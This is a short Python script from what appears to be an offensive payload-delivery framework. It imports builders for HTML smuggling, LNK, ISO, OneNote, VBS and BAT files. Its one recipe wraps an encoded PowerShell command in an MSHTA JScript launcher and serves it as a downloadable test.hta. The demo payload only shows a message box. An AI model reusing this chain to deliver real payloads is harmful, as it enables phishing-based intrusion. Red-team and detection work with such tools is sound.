from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.mshta.mshta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recepi():
    # MSHTA -> Powershell:MessageBox
    routes = []

    ps1msgbox: AceStr = makePowershellMessageBox()
    ps1msgbox: AceStr = makePowershellEncodedCommand(ps1msgbox)
    cmd: AceStr = AceStr("powershell.exe -EncodedCommand {}".format(ps1msgbox))
    mshta: AceStr = makeMshtaJscriptExec(cmd)
    containerServe: AceRoute = AceRoute('/test.hta', mshta, download=True, downloadName='test.hta')
    routes.append(containerServe)
    serve(routes)


if __name__ == "__main__":
    recepi()
